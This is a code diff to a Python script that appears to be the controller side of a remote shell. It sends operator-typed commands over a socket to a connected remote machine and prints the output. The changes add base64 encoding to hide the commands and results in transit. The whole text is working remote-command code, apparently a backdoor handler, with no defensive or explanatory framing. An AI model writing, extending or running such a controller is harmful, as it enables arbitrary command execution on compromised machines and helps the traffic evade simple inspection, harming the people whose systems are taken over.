@@ -1,7 +1,17 @@
 import socket
 import pyfiglet
 import os
+import base64
 
+"""This function is used to encode the data to be send"""
+def en(data):
+    return base64.b64encode(data.encode())
+
+"""This is used to decode the instructions arriving from the remote computer"""
+def de(data):
+    return base64.b64decode(data)
+
+"""This is the driver code"""
 def main():
     # Display the initial message
     os.system('tput clear')
@@ -21,13 +31,17 @@ def main():
     print("Client is:",client)
 
     while True:
-        client.send('pwd'.encode())
-        r=client.recv(2048).decode()
+        a=en('pwd')
+        client.send(a)
+        r1=client.recv(2048).decode()
+        r=de(r1).decode()
         # print("Current directory is:",r)
-        c=input('~'+r[:len(r)-2]+'$').encode()
+        c=input('~'+r[:len(r)-2]+'$')
+        c=en(c)
         # Sending the encoded command to the remote system
         client.send(c)
-        res=client.recv(2048).decode().split('~')
+        res1=client.recv(2048).decode()
+        res=de(res1).decode().split('~')
         if res[1]:
             print(res[1])
         else:
